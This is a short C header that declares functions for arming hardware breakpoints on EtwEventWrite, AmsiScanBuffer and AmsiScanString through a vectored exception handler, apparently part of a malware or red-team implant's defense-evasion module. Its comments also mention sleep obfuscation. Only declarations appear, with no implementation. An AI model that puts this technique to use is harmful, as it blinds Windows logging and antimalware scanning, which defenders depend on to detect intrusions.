#pragma once
#include <windows.h>

/*
 * hwbp_patch_etw()   — arm Dr0 on EtwEventWrite
 * hwbp_patch_amsi()  — arm Dr1 on AmsiScanBuffer, Dr2 on AmsiScanString
 * hwbp_patch_all()   — arm all three (ETW + AMSI)
 *
 * Each call is idempotent — safe to call multiple times.
 * Registers a VEH handler on first call.
 *
 * hwbp_apply_thread(ht) — propagate active breakpoints to another thread
 *                         (e.g. a timer thread created during sleep obfuscation)
 */
void hwbp_patch_etw(void);
void hwbp_patch_amsi(void);
void hwbp_patch_all(void);
void hwbp_apply_thread(HANDLE hThread);
